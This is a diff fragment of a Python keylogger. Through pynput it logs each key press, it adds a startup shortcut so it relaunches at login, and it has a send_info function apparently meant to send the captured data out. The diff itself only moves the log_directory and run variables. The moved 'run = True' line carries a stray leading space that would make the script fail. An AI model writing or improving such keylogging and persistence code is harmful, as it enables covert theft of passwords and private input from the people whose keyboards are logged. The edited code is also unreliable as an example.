@@ -3,10 +3,6 @@ from pynput.keyboard import Key, Listener
 from win32com.client import Dispatch
 from pathlib import Path
 
-log_directory = "" #The directory that the log will be stored at.
-                   #Leave Empty to store it in the directory of this file.
-run = True
-
 def create_shortcut():
     #If a startup shortcut doesn't exits it will create one.
     current_path = os.path.dirname(os.path.abspath(__file__))
@@ -59,6 +55,10 @@ def send_info(message):
 
 def on_press(key):
     logging.info(str(key))
+    
+log_directory = "" #The directory that the log will be stored at.
+                   #Leave Empty to store it in the directory of this file.
+ run = True
 
 create_shortcut() #At the beggining of the program execute this function.
 check_file() #After create_shortcut() is finished this executes.
